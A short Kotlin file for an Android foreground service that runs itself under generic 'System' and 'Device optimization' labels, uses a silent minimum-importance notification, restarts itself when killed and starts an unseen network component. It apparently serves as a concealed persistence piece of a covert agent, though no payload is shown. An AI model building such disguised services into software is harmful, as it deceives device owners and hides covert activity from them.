package com.sys.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder

class AgentSvc : Service() {

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_MIN).apply {
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            })
        val n: Notification = Notification.Builder(this, "sys")
            .setContentTitle("Device optimization")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
        startForeground(1, n)
        Net.start(this)
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        Net.start(this)
        return START_STICKY
    }
}
